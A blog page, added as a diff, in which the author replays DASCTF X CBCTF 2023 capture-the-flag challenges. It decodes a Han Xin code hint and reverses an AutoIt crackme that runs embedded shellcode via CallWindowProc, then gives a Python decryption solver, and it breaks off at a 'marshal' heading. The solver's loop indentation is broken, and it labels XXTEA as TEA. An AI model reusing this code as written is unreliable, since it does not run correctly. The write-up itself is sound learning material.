@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Juana_2u">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://juana-2u.github.io/2023/11/04/dasctfxcbctf2023-study&re/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="DASCTF X CBCTF 2023复现和学习MISCjustlisten了解到题目中的hint图片是汉信码（又涨知识了），使用下面的网站扫描图片得到的解码结果，得到密码:0urS3cret 在线汉信码识别,汉信码解码 - 兔子二维码   REVERSEauuuu3通过解析autoit动态脚本语言执行命令，先安装这个工具 https:&#x2F;&#x2F;github.com&#x2F;nazywam&#x2F;AutoIt-Rip">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTFxCBCTF2023-Study&amp;Re">
+<meta property="og:url" content="https://juana-2u.github.io/2023/11/04/DASCTFxCBCTF2023-Study&Re/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="DASCTF X CBCTF 2023复现和学习MISCjustlisten了解到题目中的hint图片是汉信码（又涨知识了），使用下面的网站扫描图片得到的解码结果，得到密码:0urS3cret 在线汉信码识别,汉信码解码 - 兔子二维码   REVERSEauuuu3通过解析autoit动态脚本语言执行命令，先安装这个工具 https:&#x2F;&#x2F;github.com&#x2F;nazywam&#x2F;AutoIt-Rip">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://juana-2u.github.io/Post_images/DASCTFxCBCTF2023-Study&Re.assets/Untitled-1699105524202-1.png">
+<meta property="og:image" content="https://juana-2u.github.io/Post_images/DASCTFxCBCTF2023-Study&Re.assets/AUUU3.png">
+<meta property="og:image" content="https://juana-2u.github.io/Post_images/DASCTFxCBCTF2023-Study&Re.assets/example1.png">
+<meta property="og:image" content="https://juana-2u.github.io/Post_images/DASCTFxCBCTF2023-Study&Re.assets/example2.png">
+<meta property="og:image" content="https://juana-2u.github.io/Post_images/DASCTFxCBCTF2023-Study&Re.assets/example3.png">
+<meta property="og:image" content="https://juana-2u.github.io/Post_images/DASCTFxCBCTF2023-Study&Re.assets/example4.png">
+<meta property="og:image" content="https://juana-2u.github.io/Post_images/DASCTFxCBCTF2023-Study&Re.assets/PING.png">
+<meta property="article:published_time" content="2023-11-04T13:43:39.000Z">
+<meta property="article:modified_time" content="2023-11-09T12:22:57.123Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf_Replay">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://juana-2u.github.io/Post_images/DASCTFxCBCTF2023-Study&Re.assets/Untitled-1699105524202-1.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/ico.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/ico.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/ico.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            DASCTFxCBCTF2023-Study&amp;Re -
+        
+        Juana_2u
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"juana-2u.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["记录来时的路"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":"#FF5722"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Juana_2uのhappyworld","subtitle":{"text":["BEING HAPPY IS THE MOST IMPORTANT!!"," I have a dream!","Sometimes you have to trust your gut.","If you start at the bottom,pay your dues,life here can be a dream come true.","Loading..."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":"https://www.zhihu.com/people/fawn-16-32","twitter":null,"email":"2530624471@qq.com# your email","bilibili":"https://space.bilibili.com/440820814?spm_id_from=333.1007.0.0"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"An der schönen blauen Donau,Walzer,op.314","artist":"Johann Strauss II","url":"https://open.spotify.com/embed/track/5odlY52u43F5BjByhxg7wg?utm_source=generator","cover":"http://p1.music.126.net/ZahwBmJHBnG9Gm4VC51Yew==/109951168758832434.jpg?param=180y180"},{"name":"City of Stars","artist":"Ryan Gosling,Emma Stone","url":"https://open.spotify.com/embed/track/1xk2Z84gbcn4tPXiiutxzS?utm_source=generator","cover":"http://p1.music.126.net/ZahwBmJHBnG9Gm4VC51Yew==/109951168758832434.jpg?param=180y180"},{"name":"Stray sheep","artist":"Kenshi Yonezu","url":"https://open.spotify.com/track/0iniTNHwqBiP4UDE1dgUpD?si=94e55cca33114e88","cover":"http://p1.music.126.net/ZahwBmJHBnG9Gm4VC51Yew==/109951168758832434.jpg?param=180y180"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user"},"tags":{"icon":"fa-solid fa-tags","path":"/tags/","categories":{"icon":"fa-solid fa-folder","path":"/categories/"},"Links":{"icon":"fa-regular fa-link"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/5/10 23:30:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Juana_2u
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags/"  >
+                                    
+                                        
+                                            <i class="fa-solid fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags/"  >
+                             
+                                
+                                    <i class="fa-solid fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">DASCTFxCBCTF2023-Study&amp;Re</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header flex flex-row gap-2 items-center">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Juana_2u</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">记录来时的路</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-11-04 21:43:39</span>
+        <span class="mobile">2023-11-04 21:43:39</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-09 20:22:57</span>
+            <span class="mobile">2023-11-09 20:22:57</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf-Replay/">ctf_Replay</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h1 id="DASCTF-X-CBCTF-2023复现和学习"><a href="#DASCTF-X-CBCTF-2023复现和学习" class="headerlink" title="DASCTF X CBCTF 2023复现和学习"></a>DASCTF X CBCTF 2023复现和学习</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="justlisten"><a href="#justlisten" class="headerlink" title="justlisten"></a><strong><strong>justlisten</strong></strong></h2><p>了解到题目中的hint图片是<strong>汉信码</strong>（又涨知识了），使用下面的网站扫描图片得到的解码结果，得到密码:<code>0urS3cret</code></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tuzim.net/hxdecode/" >在线汉信码识别,汉信码解码 - 兔子二维码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/Untitled-1699105524202-1.png"
+                      alt="Untitled"
+                ></p>
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="auuuu3"><a href="#auuuu3" class="headerlink" title="auuuu3"></a><strong><strong>auuuu3</strong></strong></h2><p>通过解析autoit动态脚本语言执行命令，先安装这个工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nazywam/AutoIt-Ripper"><code>https://github.com/nazywam/AutoIt-Ripper</code></a></p>
+<p>在Scripts文件夹中找到<code>autoit-ripper.exe</code>程序，按照语法输入得到script.au3文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/AUUU3.png"
+                      alt="AUUU3"
+                ></p>
+<p>得到的au3文件分析加密的流程。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Func ENC ( $DATA , $KEY )</span><br><span class="line">	$DATA = Binary ( $DATA )</span><br><span class="line">	Local $DATALEN = BinaryLen ( $DATA )</span><br><span class="line">	If $DATALEN = <span class="number">0</span> Then</span><br><span class="line">		Return <span class="string">&quot;&quot;</span></span><br><span class="line">	ElseIf $DATALEN &lt; <span class="number">8</span> Then</span><br><span class="line">		$DATALEN = <span class="number">8</span></span><br><span class="line">	EndIf</span><br><span class="line">	Local $OPCODE = <span class="string">&quot;0x83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000&quot;</span></span><br><span class="line">	Local $CODEBUFFER = DllStructCreate ( <span class="string">&quot;byte[&quot;</span> &amp; BinaryLen ( $OPCODE ) &amp; <span class="string">&quot;]&quot;</span> )</span><br><span class="line">	DllStructSetData ( $CODEBUFFER , <span class="number">1</span> , $OPCODE )</span><br><span class="line">	Local $V = DllStructCreate ( <span class="string">&quot;byte[&quot;</span> &amp; Ceiling ( $DATALEN / <span class="number">4</span> ) * <span class="number">4</span> &amp; <span class="string">&quot;]&quot;</span> )</span><br><span class="line">	DllStructSetData ( $V , <span class="number">1</span> , $DATA )</span><br><span class="line">	Local $K = DllStructCreate ( <span class="string">&quot;byte[16]&quot;</span> )</span><br><span class="line">	DllStructSetData ( $K , <span class="number">1</span> , $KEY )</span><br><span class="line">	DllCall ( <span class="string">&quot;user32.dll&quot;</span> , <span class="string">&quot;none&quot;</span> , <span class="string">&quot;CallWindowProc&quot;</span> , <span class="string">&quot;ptr&quot;</span> , DllStructGetPtr ( $CODEBUFFER ) , <span class="string">&quot;ptr&quot;</span> , DllStructGetPtr ( $V ) , <span class="string">&quot;int&quot;</span> , Ceiling ( $DATALEN / <span class="number">4</span> ) , <span class="string">&quot;ptr&quot;</span> , DllStructGetPtr ( $K ) , <span class="string">&quot;int&quot;</span> , <span class="number">0</span> )</span><br><span class="line">	Local $RET = DllStructGetData ( $V , <span class="number">1</span> )</span><br><span class="line">	$CODEBUFFER = <span class="number">0</span></span><br><span class="line">	$V = <span class="number">0</span></span><br><span class="line">	$K = <span class="number">0</span></span><br><span class="line">	Return $RET</span><br><span class="line">EndFunc</span><br><span class="line"><span class="comment">##输入字符的加密函数ENC 函数动态加载user32.dll函数，从中调用加密函数加密</span></span><br><span class="line">$FORM1 = GUICreate ( <span class="string">&quot;auuuu3&quot;</span> , <span class="number">378</span> , <span class="number">185</span> , <span class="number">254</span> , <span class="number">182</span> )</span><br><span class="line">GUICtrlSetFont ( + <span class="number">4294967295</span> , <span class="number">14</span> , <span class="number">400</span> , <span class="number">0</span> , <span class="string">&quot;MS Sans Serif&quot;</span> )</span><br><span class="line">$SERIAL = GUICtrlCreateInput ( <span class="string">&quot;&quot;</span> , <span class="number">56</span> , <span class="number">48</span> , <span class="number">257</span> , <span class="number">21</span> )</span><br><span class="line">$CHECK = GUICtrlCreateButton ( <span class="string">&quot;Check&quot;</span> , <span class="number">56</span> , <span class="number">80</span> , <span class="number">257</span> , <span class="number">33</span> )</span><br><span class="line">GUISetState ( @SW_SHOW )</span><br><span class="line">While <span class="number">1</span></span><br><span class="line">	$NMSG = GUIGetMsg ( )</span><br><span class="line">	Switch $NMSG</span><br><span class="line">	Case $GUI_EVENT_CLOSE</span><br><span class="line">		Exit</span><br><span class="line">	Case $CHECK</span><br><span class="line">		Dim $CIPHERTEXT = <span class="string">&quot;0x7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675&quot;</span></span><br><span class="line">		$KEY = <span class="string">&quot;Wowww111auUu3&quot;</span></span><br><span class="line">		$STR = GUICtrlRead ( $SERIAL )</span><br><span class="line">		If StringLen ( $STR ) &lt;&gt; <span class="number">38</span> Then</span><br><span class="line">			MsgBox ( <span class="string">&quot;&quot;</span> , <span class="string">&quot;&quot;</span> , <span class="string">&quot;wrong&quot;</span> )</span><br><span class="line">			ContinueCase</span><br><span class="line">		EndIf</span><br><span class="line">		$ENCRYPT = ENC ( $STR , $KEY )</span><br><span class="line">		If $ENCRYPT == $CIPHERTEXT Then</span><br><span class="line">			MsgBox ( <span class="string">&quot;&quot;</span> , <span class="string">&quot;&quot;</span> , <span class="string">&quot;correct&quot;</span> )</span><br><span class="line">			ContinueCase</span><br><span class="line">		EndIf</span><br><span class="line">		MsgBox ( <span class="string">&quot;&quot;</span> , <span class="string">&quot;&quot;</span> , <span class="string">&quot;wrong&quot;</span> )</span><br><span class="line">	EndSwitch</span><br><span class="line">WEnd</span><br></pre></td></tr></table></figure></div>
+
+<p>使用ENC函数加密后的dll文件调用，使用上面的密文加载一个dll文件</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">opcode =<span class="string">&quot;83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000&quot;</span></span><br><span class="line">hex_bytes = binascii.a2b_hex(opcode)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;enc.dll&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(hex_bytes)</span><br></pre></td></tr></table></figure></div>
+
+<p>生成的dll文件放进ida查看伪代码，生成的全是字符，使用findcrypto插件发现是TEA加密算法，编写的exp</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import binascii</span></span><br><span class="line"><span class="comment"># opcode =&quot;83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000&quot;</span></span><br><span class="line"><span class="comment"># hex_bytes = binascii.a2b_hex(opcode)</span></span><br><span class="line"><span class="comment"># with open(&quot;enc.dll&quot;,&#x27;wb&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(hex_bytes)</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MX</span>(<span class="params">z, y, total, key, p, e</span>):</span><br><span class="line">    temp1 = (z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    temp2 = (total.value ^ y.value) + (key[(p &amp; <span class="number">3</span>) ^ e.value] ^ z.value)</span><br><span class="line">    <span class="keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">n, v, key</span>):</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    total = c_uint32(-rounds * delta)</span><br><span class="line">    y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    e = c_uint32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        e.value = (total.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        z = c_uint32(v[p - <span class="number">1</span>])</span><br><span class="line">        v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value</span><br><span class="line">        y.value = v[p]</span><br><span class="line">    z = c_uint32(v[n - <span class="number">1</span>])</span><br><span class="line">    v[<span class="number">0</span>] = c_uint32(v[<span class="number">0</span>] - MX(z, y, total, key, <span class="number">0</span>, e).value).value</span><br><span class="line">    y.value = v[<span class="number">0</span>]</span><br><span class="line">    total.value += delta</span><br><span class="line">    rounds -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ct =<span class="string">&quot;7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675&quot;</span></span><br><span class="line">    ct = binascii.a2b_hex(ct)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">key = <span class="string">&quot;Wowww111auUu3&quot;</span></span><br><span class="line">v = struct.unpack(<span class="string">&#x27;&lt;10I&#x27;</span>, ct)</span><br><span class="line">k = struct.unpack(<span class="string">&#x27;&lt;4I&#x27;</span>, key.encode() + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">v = <span class="built_in">list</span>(v)</span><br><span class="line">k = <span class="built_in">list</span>(k)</span><br><span class="line">n = <span class="number">10</span></span><br><span class="line">res = decrypt(n, v, k)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(r.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>).decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a><strong><strong>marshal</strong></strong></h2><p>原题python脚本</p>
